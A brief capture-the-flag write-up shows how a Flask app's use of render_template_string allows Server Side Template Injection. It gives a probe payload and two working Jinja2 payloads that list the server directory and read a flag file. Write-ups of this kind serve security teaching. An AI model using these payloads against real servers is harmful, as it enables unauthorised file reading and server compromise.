Looking at the source code:
![image](https://github.com/PranjalBasak/Documentation/assets/66166653/6258fa9e-fb6c-4d6e-963f-1f3f40457365)

There is a method used `render_template_string`. An attacker could provide malicious input and exploit Server Side Template Injection (SSTI) vulnerability. A sample payload to test it would be:
`{{7+7}}` which would evaluate to 14 if the vulnerability exists.

After confirming the vulnearbility, I ran these payloads:
```python
{{ lipsum.__globals__["os"].listdir('.') }} # Read Current Directory
{{ lipsum.__globals__["__builtins__"].open('flag').read() }} # Read the flag file which is in our current directory
```

We can easily read the flag now.


